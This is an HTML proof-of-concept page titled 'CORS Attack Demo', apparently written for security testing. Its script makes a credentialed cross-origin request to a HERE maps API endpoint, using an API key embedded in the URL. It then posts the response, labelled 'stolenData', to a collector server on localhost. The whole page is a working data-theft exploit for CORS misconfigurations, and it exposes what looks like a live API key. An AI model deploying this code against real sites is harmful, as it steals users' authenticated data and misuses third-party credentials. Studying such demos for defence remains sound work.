<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Attack Demo</title>
</head>
<body>
    <h1>CORS Attack Demo</h1>
    <script>
var req = new XMLHttpRequest();
req.onload = reqListener;  
req.onerror = function() {
    console.error('Request failed');
};
req.open('GET', 'https://browse.search.hereapi.com/v1/browse?apiKey=sOp9lrUJDOgPABtkVdTXdoNSSe3iofUIjiWcKe-7Z1M&categoiries=car-dealer-repair&chains=322&at=52.520008%2C13.404954000000002&limit=50&lang=en-GB&t=m21ms5zl&callback=Request.JSONP.request_map.request_3', true);
req.withCredentials = true;  
req.send();  

function reqListener() {
    var response = encodeURIComponent(this.responseText);
    
    // Send the response to your Flask server
    fetch('http://localhost:8080/log', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ stolenData: response })
    })
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error('Error sending data:', err));
}
    </script>
</body>
</html>
